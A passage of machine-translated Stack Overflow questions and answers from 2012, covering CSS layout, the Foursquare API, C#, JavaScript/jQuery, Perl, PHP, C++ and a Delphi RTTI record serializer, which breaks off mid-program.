           <h1 style="padding-left: 50px; font-weight: bold; color: #000000;">NEWS</h1>
        </div>
     </div>
     <div id="container-bottom"></div>
  </div> 
```

CSS：#content {浮动：左；边距：5px 自动；边框：红色 1px 实心；}

```
#container-top {
   width: 800px;
   height: 23px;
   background: url(http://cdn2.tribalwars.net/graphic/index/sprites.png) no-repeat 0 -39px;
}

#container-body {
   padding: 15px;
   overflow: visible;
   background: url(http://cdn2.tribalwars.net/graphic/index/bg-content-line.jpg) repeat-y;
}

#container-right {
   float: right;
   width: 275px;
}

#container-left {
   float: left;
   width: 440px;
}

#container-bottom {
   width: 800px;
   height: 23px;
   background: url(http://cdn2.tribalwars.net/graphic/index/sprites.png) no-repeat 0 -56px;
   clear: both;
} 
```

如果你去![例子](../Images/ec2f83eeb817c043ea84a68083dccb94.png)你可以

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:31:56.043

你需要让你的容器溢出隐藏，因为你是漂浮的孩子。

结帐代码在[http://jsfiddle.net/xUf87/](http://jsfiddle.net/xUf87/)

# api - Foursquare：搜索“未分类”场所

> ID：11427669
> 
> 赞同：0
> 
> 时间：2012-07-11T07:28:14.640
> 
> 标签：api, search, foursquare, categories

我正在尝试研究有关我所在城市的foursquare使用情况的一些数据，为此我需要编制所有场地的列表。最合理的方法似乎是，如果我每个类别有 50 个场地（这是响应限制），则按类别轮询新区域中的场地并将其分成较小的场地。

问题是，有些场所的类别设置为“未分类”。例如[https://foursquare.com/v/fonzi/4e20f6af45dd950bb020b1c1](https://foursquare.com/v/fonzi/4e20f6af45dd950bb020b1c1)

我该如何投票？设置`categoryId`为`Null`，`""`或`"Uncategorized"`不起作用。

我希望你能帮忙:)

PS 在做`venues/search`with`intent: "browse"`时，如果面积非常小，您是否还会获得超出您限制的场地？在我看来是这样，但我可能做错了什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-12T22:22:29.407

没有办法将您的查询过滤到未分类的场所。对不起！

# c# - 读取大文件时出现 IOException

> ID：11427672
> 
> 赞同：0
> 
> 时间：2012-07-11T07:28:39.260
> 
> 标签：c#, .net, exception-handling

这是我将文件从一个文件写入另一个文件的代码。它适用于大小小于 2GB 的文件，但当文件更大时会抛出异常。所以它复制了少于 2 gb 的数据，然后抛出异常。有什么修复吗？

```
const int bufferSize = 2048;
byte[] buffer = new byte[bufferSize];
int bytes = 0;
using (var input = filedata.DataStream)
using (var output = ServiceModel.FileManager.Current.GetFile(filedata.FileName).Open(FileMode.CreateNew, FileAccess.Write, FileShare.Read))
{
    while ((bytes = input.Read(buffer, 0, bufferSize)) > 0) //Throws exception: An exception has been thrown when reading the stream.
    {
        output.Write(buffer, 0, bytes);
    }
} 
```

# javascript - 没有返回类型的函数的 Javascript 单元测试

> ID：11427675
> 
> 赞同：2
> 
> 时间：2012-07-11T07:28:43.190
> 
> 标签：javascript, unit-testing

我刚刚开始从事 JavaScript 单元测试，我是新手。

我找到了许多单元测试框架，我决定使用 QUnit。但我想问的是，在单元测试中，大多数框架就像我们将不同的值传递给函数，然后将返回值与期望值进行比较，然后通过或失败测试。在我的情况下，我没有返回值的所有函数。一些正在更改类变量，即 vars 数组等在同一个函数中更改。

所以只想问有没有办法检查这种类型的函数还是必须有一个返回类型？

如果是，那么我是否应该事先知道每个 var 或数组的预期值？

感谢任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-30T16:24:13.323

如果该函数只是修改成员数据，您可以在调用该函数之前查询数据，然后在调用该函数后再次查询该数据。这样，您就可以确定该函数是否真的在做它应该做的事情，它应该做的事情。

伪示例：

```
var MyClass = function(data) {

    // Suppose data is an array
    this.data = data;

    this.sort = function() {
        // sorts data
    };

};

// Test #1:
var myClass = new MyClass([5, 3, 2, 4, 1]);
myClass.sort();

var expected = [1, 2, 3, 4, 5];
deepEqual(myClass.data, expected); 
```

# javascript - 使用 jQuery/JS 向上/向下切换 DIV 元素

> ID：11427677
> 
> 赞同：0
> 
> 时间：2012-07-11T07:28:45.450
> 
> 标签：javascript, jquery, html

我正在尝试向上或向下移动动态表单的 div 元素：

这是我的表格：

```
 <form name="f_form">
        Order name <input type="text" name="ord" id="order" />

        <div id="fields">
<div id="hid1"><a href="#" id="did1">
<img src="d.jpg" /></a><a href="#" id="uid1">
<img src="u.jpg" /></a><input type="text" name="p_name[]" id="names" />
<input type="text" name="quant[]" id="quant" size="3" />
<input type="text" name="pr[]" id="price" size="10" />
<input type="text" name="sum_a" id="sum" size="10" disabled="disabled"/>
        </div>
<input type="button" name="nauj" id="nau" value="Add item"/><br />
    </div>
    </form> 
```

当我单击“添加项目”按钮时，调用 JS：

```
$("#nau").click(function () {
(newdiv = document.createElement('div')).id = "hid"+ (counter + 1) +"";
newdiv.innerHTML = '<a href="#" id="did'+ (counter + 1) +'"><img src="d.jpg" /></a><a href="#" id="uid'+ (counter + 1) +'"><img src="u.jpg" /></a><input type="text" name="p_name[]" id="names" />
<input type="text" name="quant[]" id="quant" size="3" />
<input type="text" name="pr[]" id="price" size="10" />
<input type="text" name="sum_a" id="sum" size="10" disabled="disabled"/><a href="#" id="delete'+ (counter + 1) +'">X</a>';
             document.getElementById('fields').appendChild(newdiv);
             counter++;
}); 
```

每个表单字段行都有两个箭头（向上和向下）图像：`<a href="#" id="did'+ (counter + 1) +'"><img src="d.jpg" /></a><a href="#" id="uid'+ (counter + 1) +'"><img src="u.jpg" /></a>`

当我单击箭头时，我需要向上或向下移动所有表单字段行（移动`<DIV id=hid..>`）尝试这样但它确实有效..（向上移动功能）

```
$("a[id^='uid']").on('click', function() {
            var numrow = $(this).attr("id");
            numrow = numrow.substr(3);
            var nr = 1;

            sumrow = numrow - nr;
            var eil = 'id=' + numrow;
            numrowas = "#hid"+numrow;
            srowas = "#hid"+sumrow;
                    $(numrowas).before($(srowas));
        }); 
```

感谢您的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T08:39:34.950

首先，您没有`on()`正确使用 - 事件处理程序没有像您期望的那样绑定。正确的语法是：

```
// "watch for" elements matching selector "a[id^='did']" created inside #fields
$("#fields").on('click', "a[id^='did']", function(e) {...}) 
```

其次，您正在尝试对 id 属性进行操作，以便在添加当前元素的 div 之后/之前确定。这很混乱，一种更简洁的方法是使用`.next()`并`.prev()`确定与单击的节点相关的下一个或上一个节点是什么。

我创建了一个小提琴作为示例：http: [//jsfiddle.net/SPgax/22/](http://jsfiddle.net/SPgax/22/)

顺便说一句：你的代码很乱，我没有采取行动，因为它超出了你的问题范围。没有恶意 ：）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T08:53:33.867

使用与@WTK 相同的解决方案`.prev()`，但方法不同。哦，我忍不住做了一些清理工作；）

见[http://jsfiddle.net/WmbmF/4/](http://jsfiddle.net/WmbmF/4/)

# perl - 如何将数组的重复元素推送到新数组perl

> ID：11427680
> 
> 赞同：2
> 
> 时间：2012-07-11T07:29:04.420
> 
> 标签：perl

谁能告诉我如何将数组的重复元素推送到新数组？这就是我到目前为止所拥有的，我想再次将重复的元素保留到一个新的数组中。

```
%seen = ();
@uniq = ();
foreach $item (@list) {
    unless ($seen{$item}) {
        $seen{$item} = 1;
        push(@uniq, $item);
    }
}
print "@unique\n"; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-11T07:38:21.480

始终以`use strict;`和开始您的脚本`use warnings;`。

```
use strict ;
use warnings ;

my @list = ( 1 .. 10 , 2 , 5 , 6 ) ;

my %seen = ();
foreach my $item (@list) {
  $seen{$item}++ ;
}

my @uniq = grep { $seen{$_} == 1 } keys %seen ;
my @not_unique = grep { $seen{$_} > 1 } keys %seen ; 
```

只需计算哈希中元素的每次出现次数，然后使用 grep 即可。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-11T08:39:25.963

目前尚不清楚您要完成什么...您要删除重复项还是找到它们？以下是两者的解决方案：

## 删除重复项

```
use strict;
use warnings;

my @list = (1,2,3,4,5,6,1,2,3);

my %unique;
@unique{ @list } = ();
print join(',',sort keys %unique)."\n"; 
```

输出：

> 1,2,3,4,5,6

## 只抓取重复项

```
use strict;
use warnings;

my @list = (1,2,3,4,5,6,1,2,3);

my %dupes;
%dupes = map { $_ => $dupes{$_}++ } @list;
delete @dupes{ grep { $dupes{$_} == 0 } keys %dupes };
print join(',',sort keys %dupes)."\n"; 
```

输出：

> 1,2,3

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-11T07:35:38.377

与您的逻辑相同，但陈述不同。

```
use strict;
my @ar = (1,2,3,4,1,2);
my %ar = map { $_ ,  1 } @ar ;
my @ar1 = keys %ar;

print @ar1; 
```

[还要检查这个](https://stackoverflow.com/questions/439647/how-do-i-print-unique-elements-in-perl-array)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-07-11T16:29:10.090

如果您要查找多次出现的值：

```
my @seen;
my @dups = grep ++$seen{$_} == 2, @list; 
```

```
@list = qw( foo bar baz foo foo moo bar );
  gives
@dups = qw( foo bar ); 
```

* * *

如果您尝试将仅找到一次的`@uniq`值和找到两次或更多的值放入`@dups`：

```
my %counts; 
++$counts{$_} for @list;

my (@uniq, @dups);
for (@list) {
   my $count = $counts{$_};
   push @uniq, $_ if $count == 1;
   push @dups, $_ if $count == 2;
} 
```

```
@list = qw( foo bar baz foo foo moo bar );
  gives
@uniq = qw( baz moo );
@dups = qw( foo bar ); 
```

* * *

如果您尝试将值的第一个实例放入`@uniq`并将第二个和后续值放入`@dups`：

```
my (@uniq, @dups, %seen);
push @{ $seen{$_}++ ? \@dups : \@uniq }, $_ for @list; 
```

```
@list = qw( foo bar baz foo foo moo bar );
  gives
@uniq = qw( foo bar baz moo );
@dups = qw( foo foo bar ); 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-07-11T12:16:45.863

消除重复很简单：

```
use List::MoreUtils qw<uniq>;

my @uniq = uniq @list; 
```

获取重复项需要更明确的 Perl：

```
my %seen;
my @dups = grep { ++$seen{ '' . $_ } == 2 } @list; 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-07-11T18:13:27.050

您*必须始终* 在程序开始时声明所有变量`use strict`在首次使用时使用。在这种情况下，它会向您显示您正在向数组添加数据，但显示.`use warnings``my``@uniq``@unique`

该程序将打印所有唯一数据项的列表，以及出现两次或更多次的数据的第二个列表

```
use strict;
use warnings;

my @list = qw/ a a a b b c /;

my %seen;
my @uniq;
my @multiple;

foreach my $item (@list) {
  if (not $seen{$item}++) {
    push @uniq, $item;
  }
  elsif ($seen{$item} == 2) {
    push @multiple, $item;
  }
}
print "Unique: @uniq\n";
print "Multiple: @multiple\n"; 
```

# php - 如何定义一个定义常量并在项目中的任何位置使用它的 php 配置文件

> ID：11427681
> 
> 赞同：6
> 
> 时间：2012-07-11T07:29:08.400
> 
> 标签：php, constants, config

如何定义一个配置文件，我可以在整个项目的任何地方使用它而不包括每个地方？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-07-11T07:34:57.100

有两种方式，

1.  **[define()](http://php.net/define)**：您使用 define 方法定义的常量可用于整个项目。

    ```
    define('SITE_URL' , '/path/to/docroot/');
    echo SITE_URL; 
    ```

2.  **类常量**：类常量可用于整个项目。

    ```
    class MyConfig{
        const SITE_URL = '/path/to/docroot/';
    }
    echo MyConfig::SITE_URL; 
    ```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-07-25T11:09:28.623

利用`auto_prepend_file`

对于使用 localhost，例如 XAMPP 或 WAMP：

1.  转到 php.ini
2.  找到“auto_prepend_file”并更改为`auto_prepend_file="xampp/htdocs/dir.php"`
3.  重新启动您的 apache 服务以使其工作。
    *   有关更多信息，请参阅[本网站](http://jesin.tk/php-auto_prepend_file-and-auto_append_file/)

如果这不起作用或者您无权访问 php.ini，请尝试修改 .htaccess 文件（不过我还没有尝试过这种方法）

```
php_value auto_prepend_file "/real/path/to/file/file_name.php" 
```

*   有关更多信息，请参阅[本网站](http://www.xpertdeveloper.com/2012/02/prepend-append-files-with-htaccess/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-11T07:32:57.853

您可以在 config.php 中的单个配置文件 fe 中定义常量，然后将其包含到您需要的项目中

# c++ - 从模板类定义非模板类

> ID：11427687
> 
> 赞同：1
> 
> 时间：2012-07-11T07:29:47.777
> 
> 标签：c++

假设我有一个名为 model 的模板类。现在让我们在这个类中声明一个名为纹理的类，它不需要模板参数。我该如何定义它，以便无论模型类的模板参数如何，纹理对象都是相同的。这就是它的样子。

```
template<class T>
class Model
{
    class Texture;
};

class Model::Texture //error because model requires a template argument.
{

}; 
```

那么我可以在这里做些什么吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-11T07:31:09.610

你应该这样写：

```
template<typename T>
class Model<T>::Texture 
{
  //you should be able to use T here, even though Texture is not a template!

   T m_data;   //T here
   Texture(T data); //T here also, as the constructor parameter!

}; 
```

由于`Model`是类模板，所以这里只`T`适用于`Model`。`Texture`仍然是非模板。

[在线演示](http://ideone.com/yGARF)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T07:32:23.923

```
namespace detail {
class Texture
{

};
}

template<class T>
class Model
{
    typedef detail::Texture Texture;
}; 
```

命名空间会阻止 API的`detail`用户直接访问该类。如果您不导出任何 API，则不必担心这一点。typedef 允许通过使用模板类限定的名称访问非模板类。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-11T07:41:05.680

您还可以为此使用通用的非模板祖先：

```
class ModelBase
{
    class Texture;
};

template<class T>
class Model : public ModelBase
{

};

class ModelBase::Texture
{

}; 
```

# c# - 如何根据用户突出显示 HTML 内容并将其保存到数据库中以供将来加载

> ID：11427690
> 
> 赞同：0
> 
> 时间：2012-07-11T07:29:57.303
> 
> 标签：c#, javascript, jquery, asp.net, highlighter.net

我试图在 HTML 页面中突出显示用户选择的文本内容。我使用 jquery（dot net）突出显示了文本。现在我需要将一些信息保存到数据库中，使我能够再次突出显示相同的内容以供将来加载同一页面，同时处理文本可能包含的所有内部元素。即，对每个用户都有一个相同的基本 HTML 文件，让用户可以自由地突出显示提供的页面中的内容，在他突出显示之后，需要针对每个用户将信息保存到数据库中，这样当用户再次打开相同的 html 文件时， （面板中显示的 HTML 文件）他获得了与他之前所做的突出显示相同的页面。

请建议我应该将哪些信息保存到数据库中..任何指针我将如何前进..

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:37:14.373

不是 dot net 专家，但似乎您将内容存储在数据库中，在获取时需要突出显示它们。

最好的方法是将内容保存为 html 或编写您自己的突出显示标签

 **然后在不需要高亮时将其替换为空白，并将其替换 `<div style="background-color:red">`为高亮。

希望你得到了方法。

如果您使用的是 HTML 文件，那么最好将它们存储在数据库中。每个请求的字符串操作将是一项繁重的任务。**

# php - 插入时 PDO 2300 虽然不存在行

> ID：11427696
> 
> 赞同：0
> 
> 时间：2012-07-11T07:30:31.577
> 
> 标签：php, mysql, pdo

```
$compost = $dbh->prepare("INSERT INTO `table` 
(`PRIMARY`, `some`, `content`, `rows`, `and`, `boolean`) 
VALUES ('', :binded, :param, :inputs, :blah, 0)") ; 
```

主键自动迭代，并且经典地这意味着我的插入不需要为该列提供实际输入，只需“”就可以了。

但是，这会不断引发 2300 错误。

没有行是索引或键，只是主要的，并且在尝试此脚本之前转储了所有表行。

所以我删除了主要

```
$compost = $dbh->prepare("INSERT INTO `table` 
( `some`, `content`, `rows`, `and`, `boolean`) 
VALUES ( :binded, :param, :inputs, :blah, 0)") ; 
```

但它仍然会抛出错误，要创建一个新表并尝试

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T07:32:36.510

如果主键是自动递增的，则保留它。

```
$compost = $dbh->prepare("INSERT INTO `table` 
(`some`, `content`, `rows`, `and`, `boolean`) 
VALUES (:binded, :param, :inputs, :blah, 0)") ; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:40:18.037

如果您的`PRIMARY`列名是“PRIMARY”，您可以尝试：

```
$compost = $dbh->prepare("INSERT INTO `table` 
(`PRIMARY`, `some`, `content`, `rows`, `and`, `boolean`) 
VALUES (PRIMARY, :binded, :param, :inputs, :blah, 0)") ; 
```

或者根本不提那个领域：

```
$compost = $dbh->prepare("INSERT INTO `table` 
(`some`, `content`, `rows`, `and`, `boolean`) 
VALUES (:binded, :param, :inputs, :blah, 0)") ; 
```

# c# - 仅可用于特定类型？

> ID：11427697
> 
> 赞同：1
> 
> 时间：2012-07-11T07:30:32.703
> 
> 标签：c#, scope

以下不起作用：

```
 public string foo()
    {
        using (Random myRandomChoice = new Random())
        {
            return myRandomChoice.Next(10).ToString();
        }
    } 
```

以下是错误：

```
 public string foo()
    {
        Random myRandomChoice = new Random();
        return myRandomChoice.Next(10).ToString();
    } 
```

第一个错误消息`foo`是关于`Random`不能隐式转换为`System.IDisposable`.

这是一种故意使用语言语法的策略，因此您只`using`在特定情况下使用，例如在处理数据库连接时？还是我可以显式转换`Random`为类型`IDisposable`以便初始`foo`工作？

是否有可用的类型列表可以更好地声明`using`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-11T07:33:02.173

请参阅[使用 C#](http://msdn.microsoft.com/en-us/library/yh598w02%28v=vs.80%29.aspx)

> 提供给 using 语句的对象**必须实现 IDisposable 接口**。该接口提供了 Dispose 方法，该方法应该释放对象的资源。

由于`Random`未实现`System.IDisposable`，这就是您收到错误的原因。

来自[MSDN](http://msdn.microsoft.com/en-us/library/yh598w02.aspx)

> 通常，当您使用 IDisposable 对象时，您应该在 using 语句中声明和实例化它。using 语句以正确的方式调用对象的 Dispose 方法，并且（当您如前所示使用它时）它还会导致对象本身在调用 Dispose 时立即超出范围。在 using 块中，对象是只读的，不能修改或重新分配。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:33:06.900

`using`可以在实现`IDisposable`.

以这种方式实现的 Dispose(..) 方法将在*程序*执行跳出`using`块时立即执行。

`try/finally`编译器注入的构造的“别名”仅此而已`IL`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:34:06.840

`using`是一种更好的在 IDisposable 上调用 dispose 的语法方式（可能在 try-finally 中）：

> using 语句可确保调用 Dispose，即使在调用对象上的方法时发生异常也是如此。您可以通过将对象放在 try 块中，然后在 finally 块中调用 Dispose 来获得相同的结果；

[http://msdn.microsoft.com/en-us/library/yh598w02.aspx](http://msdn.microsoft.com/en-us/library/yh598w02.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:36:15.723

语句是一种`using`保证`Dispose`即使抛出异常也能在对象上调用的方法。因此，当对象没有实现时，它是没有意义的`IDisposable`。

以下代码示例是等效的：

(1) using 语句：

```
using (MyClass myObj = new MyClass())
{
    ...
} 
```

(2) 分`finally`块配置：

```
try
{
    MyClass myObj = new MyClass();
    ...
}
finally
{
    myObj.Dispose();
} 
```

正如你所看到的，所有 using 语句实现的都是对象的处置，因此如果你的对象没有实现 IDisposable 是没有意义的。

[FXCop](http://msdn.microsoft.com/en-us/library/bb429476.aspx)有一个规则来检查您是否使用了针对您的类型`using`的语句。`IDisposable`请参阅[此 StackOverflow 问题](https://stackoverflow.com/q/1033334/177018)，了解查找哪些类型实现`IDisposable`并可以在 using 语句中使用的其他方法。

有关详细信息，请参阅[MSDN 文档](http://msdn.microsoft.com/en-us/library/yh598w02.aspx)。

# jquery - jquery timepicker 最小时间设置

> ID：11427701
> 
> 赞同：0
> 
> 时间：2012-07-11T07:30:44.533
> 
> 标签：jquery

我正在尝试使用 Jquery Timepicker 插件根据所选的开始时间值设置结束时间的最短时间。

```
 $('#start_time').timepicker({timeFormat: 'hh:mm TT',ampm: true,hour:10,
                                    onSelect: function( selectedDate ) {
                                       $('#end_time').timepicker("option","hourMin", '10');
                                    }
                                 }); 
```

上面的代码不起作用

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T09:25:53.917

好像您正在使用[Trent Richardson](http://trentrichardson.com/examples/timepicker/)的 timepicker 插件。

这是此时间选择器的已知[问题](https://github.com/trentrichardson/jQuery-Timepicker-Addon/issues/195)，已请求修复。所以它可能会在插件的未来版本中修复/添加。

现在你可以使用这个[Fiddle](http://jsfiddle.net/dHYhk/4/)中的（脏）修复。

# jquery - 将记录转换为序列化表单数据以通过 HTTP 发送

> ID：11427706
> 
> 赞同：3
> 
> 时间：2012-07-11T07:31:06.320
> 
> 标签：jquery, delphi, serialization, delphi-2010

有没有办法转换这条记录

```
TError = record
  code: Word;
  message: String;
end;

TState = record
  caption: String;
  address: Cardinal;
  counters: TArray<Word>;
  errors: TArray<TError>;
end; 
```

序列化表单数据字符串（`Content-Type: application/x-www-form-urlencoded`），如

```
caption=Foo&
address=175896&
counters[]=2&
counters[]=2&
errors[0][code]=52&
errors[0][message]=ERR_NOT_AVAILABLE 
```

通过 HTTP 发送？

也许有一些类似于[JQuery.param()](http://api.jquery.com/jQuery.param/)的功能？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-16T23:31:39.437

好的，这是一个样板解决方案，它也可以适应您的特定序列化或其他用途。

一条记录 ,`TSerializer`完成所有的序列化工作，结果存储在一个字符串列表中。

`Serialize('state', TValue.From(state),sList);`要使用它，请从`TSerializer`实例调用方法。

您可以添加适合 a 的大多数类型`TValue`，包括记录、静态数组、动态数组和简单类。所有元素的展开都是通过递归进行的。（免责声明，这是在 XE2 上测试的，但我认为 Delphi-2010 支持此处使用的所有增强型 RTTI 调用）

您的示例的输出如下所示：

```
record state:TState
  caption:string=Foo
  address:Cardinal=175896
  dynamic array counters:Word
    counters[0]:Word=2
    counters[1]:Word=2
  end
  dynamic array errors:TError
    record errors[0]:TError
      code:Word=52
      message:string=ERR_NOT_AVAILABLE
    end
  end
end 
```

这是源单元：

```
unit SerializerBoilerplate;

interface

uses
  System.SysUtils, Classes, RTTI, TypInfo;

Type
  TSerializer = record
  private
    FSumIndent: string;
    procedure IncIndent;
    procedure DecIndent;
  public
    procedure Serialize(const name: string; thing: TValue;
      sList: TStrings; first: boolean = true);
  end;

implementation

procedure TSerializer.IncIndent;
begin
  FSumIndent := FSumIndent + '  ';
end;

procedure TSerializer.DecIndent;
begin
  SetLength(FSumIndent, Length(FSumIndent) - 2);
end;

procedure TSerializer.Serialize(const name: string; thing: TValue;
  sList: TStrings; first: boolean);
type
  PPByte = ^PByte;
var
  LContext: TRTTIContext;
  LField: TRTTIField;
  LProperty: TRTTIProperty;
  LRecord: TRTTIRecordType;
  LClass: TRTTIInstanceType;
  LStaticArray: TRTTIArrayType;
  LDynArray: TRTTIDynamicArrayType;
  LDimType: TRttiOrdinalType;
  LArrayIx: array of integer;
  LArrayMinIx: array of integer;
  LArrayMaxIx: array of integer;
  LNewValue: TValue;
  i: integer;
  // Generic N-dimensional array indexing
  procedure IncIx(var ArrayIx, ArrayMinIx, ArrayMaxIx: array of integer);
  var
    dimIx: integer;
  begin
    dimIx := Length(ArrayIx) - 1;
    repeat
      if (ArrayIx[dimIx] < ArrayMaxIx[dimIx]) then
      begin
        Inc(ArrayIx[dimIx]);
        break;
      end
      else
      begin
        ArrayIx[dimIx] := ArrayMinIx[dimIx];
        Dec(dimIx);
        if (dimIx < 0) then
          break;
      end;
    until (true = false);
  end;
  // Convert N-dimensional index to a string
  function IxToString(const ArrayIx: array of integer): string;
  var
    i: integer;
  begin
    Result := '';
    for i := 0 to High(ArrayIx) do
      Result := Result + '[' + IntToStr(ArrayIx[i]) + ']';
  end;
  // Get correct reference
  function GetValue(Addr: Pointer; Typ: TRTTIType): TValue;
  begin
    TValue.Make(Addr, Typ.Handle, Result);
  end;

begin
  if first then
    FSumIndent := '';

  case thing.Kind of
    { - Number calls }
    tkInteger, // Identifies an ordinal type.
    tkInt64, // Identifies the Int64/UInt64 types.
    tkPointer: // Identifies a pointer type.
      begin
        sList.Add(FSumIndent + name + ':' + thing.TypeInfo.name + '=' +
          thing.ToString);
      end;
    tkEnumeration:
      begin
        if (thing.TypeInfo = TypeInfo(boolean)) then
        begin
          sList.Add(FSumIndent + name + ':' + thing.TypeInfo.name + '=' +
            BoolToStr(thing.AsBoolean));
        end
        else begin
          // ToDO : Implement this
        end;
      end; // Identifies an enumeration type.
    tkSet: // Identifies a set type.
      begin
        // ToDO : Implement this
      end;
    { - Float calls }
    tkFloat: // Identifies a floating-point type. (plus Date,Time,DateTime)
      begin
        if (thing.TypeInfo = TypeInfo(TDate)) then
        begin
          sList.Add(FSumIndent + name + ':' + thing.TypeInfo.name + '=' +
            DateToStr(thing.AsExtended));
        end
        else if (thing.TypeInfo = TypeInfo(TTime)) then
        begin
          sList.Add(FSumIndent + name + ':' + thing.TypeInfo.name + '=' +
            TimeToStr(thing.AsExtended));
        end
        else if (thing.TypeInfo = TypeInfo(TDateTime)) then
        begin
          sList.Add(FSumIndent + name + ':' + thing.TypeInfo.name + '=' +
            DateTimeToStr(thing.AsExtended));
        end
        else
        begin
          sList.Add(FSumIndent + name + ':' + thing.TypeInfo.name + '=' +
            FloatToStr(thing.AsExtended));
        end;
        // ToDO : Handle currency
      end;

    { - String,character calls }
    tkChar, // Identifies a single-byte character.
    tkString, // Identifies a short string type.
    tkLString: // Identifies an AnsiString type.
      begin
        sList.Add(FSumIndent + name + ':' + thing.TypeInfo.name + '=' +
          thing.AsString);
      end;
    tkWString: // Identifies a WideString type.
      begin
        sList.Add(FSumIndent + name + ':' + thing.TypeInfo.name + '=' +
          thing.ToString);
      end;
    tkInterface: // Identifies an interface type.
      begin
        // ToDO : Implement this
      end;
    tkWChar, // Identifies a 2-byte (wide) character type.
    tkUString: // Identifies a UnicodeString type.
      begin
        sList.Add(FSumIndent + name + ':' + thing.TypeInfo.name + '=' +
          thing.AsString);
      end;

    tkVariant: // Identifies a Variant type.
      begin
        // ToDO : Implement this
      end;

    { - Generates recursive calls }
    tkArray: // Identifies a static array type.
      begin
        LStaticArray := LContext.GetType(thing.TypeInfo) as TRTTIArrayType;
        SetLength(LArrayIx, LStaticArray.DimensionCount);
        SetLength(LArrayMinIx, LStaticArray.DimensionCount);
        SetLength(LArrayMaxIx, LStaticArray.DimensionCount);
        sList.Add(FSumIndent + 'static array ' + name + ':' +
          LStaticArray.ElementType.name);
        IncIndent();
        for i := 0 to LStaticArray.DimensionCount - 1 do
        begin
          LDimType := LStaticArray.Dimensions[i] as TRttiOrdinalType;
          LArrayMinIx[i] := LDimType.MinValue;
          LArrayMaxIx[i] := LDimType.MaxValue;
          LArrayIx[i] := LDimType.MinValue;
        end;
        for i := 0 to LStaticArray.TotalElementCount - 1 do
        begin
          Serialize(Name + IxToString(LArrayIx),
            GetValue( PByte(thing.GetReferenceToRawData) +
              LStaticArray.ElementType.TypeSize * i,
              LStaticArray.ElementType),
            sList,false);
          IncIx(LArrayIx, LArrayMinIx, LArrayMaxIx);
        end;
        DecIndent();
        sList.Add(FSumIndent + 'end');
      end;
    tkDynArray: // Identifies a dynamic array type.
      begin
        LDynArray := LContext.GetType(thing.TypeInfo) as TRTTIDynamicArrayType;
        sList.Add(FSumIndent + 'dynamic array ' + name + ':' +
          LDynArray.ElementType.name);
        IncIndent();
        for i := 0 to thing.GetArrayLength - 1 do
        begin
          Serialize(Name + '[' + IntToStr(i) + ']',
            GetValue( PPByte(thing.GetReferenceToRawData)^ +
              LDynArray.ElementType.TypeSize * i,
              LDynArray.ElementType),
            sList,false);
        end;
        DecIndent();
        sList.Add(FSumIndent + 'end');
      end;
    tkRecord: // Identifies a record type.
      begin
        sList.Add(FSumIndent + 'record ' + name +':' +thing.TypeInfo.name);
        LRecord := LContext.GetType(thing.TypeInfo).AsRecord;
        IncIndent();
        for LField in LRecord.GetFields do
        begin
          Serialize(LField.name, LField.GetValue(thing.GetReferenceToRawData),
            sList, false);
        end;
        DecIndent();
        sList.Add(FSumIndent + 'end');
      end;
    tkClass: // Identifies a class type.
      begin
        sList.Add(FSumIndent + 'object ' + name + ':' + thing.TypeInfo.name);
        IncIndent();
        LClass := LContext.GetType(thing.TypeInfo).AsInstance;
        for LField in LClass.GetFields do
        begin
          Serialize(LField.name,
            // A hack to get a reference to the object
            // See https://stackoverflow.com/questions/2802864/rtti-accessing-fields-and-properties-in-complex-data-structures
            GetValue(PPByte(thing.GetReferenceToRawData)^ + LField.Offset,
            LField.FieldType),
            sList,false);
        end;
        // ToDO : Implement a more complete class serializer
        DecIndent();
        sList.Add(FSumIndent + 'end');
      end;

    { - Not implemented }
    tkClassRef: ; // Identifies a metaclass type.
    tkMethod: ; // Identifies a class method type.
    tkProcedure: ; // Identifies a procedural type.
    tkUnknown: ; // Identifies an unknown type that has RTTI.
  end;
end;

end. 
```

和一个测试单元：

```
program SerializerProj;

{$APPTYPE CONSOLE}
{$R *.res}

uses
  Classes,
  SysUtils,
  RTTI,
  SerializerBoilerplate;

Type
  TMyObj = Class
  private
    fI: integer;
    fS: string;
  end;

  TInnerRec = record
    A, B, C: string;
  end;

  TDim1 = 1 .. 3;
  TDim2 = 2 .. 5;
  TMyArr = array [TDim1, TDim2] of integer; // Must be typed dimensions

  TTestRec = record
    s: string;
    ws: WideString;
    st: ShortString;
    ansiCh: AnsiChar;
    ansiS: AnsiString;
    wChar: Char;
    B: boolean;
    i: integer;
    t: TTime;
    d: TDate;
    dt: TDateTime;
    fd: Double;
    fS: Single;
    r: TInnerRec;
    arr: TMyArr;
    dArr: array of string;
    o: TMyObj;
  end;

  TError = record
    code: Word;
    message: String;
  end;

  TState = record
    caption: String;
    address: Cardinal;
    counters: TArray<Word>;
    errors: TArray<TError>;
  end;

var
  tr: TTestRec;
  state: TState;
  sList: TStringList;
  s: string;
  Serializer: TSerializer;

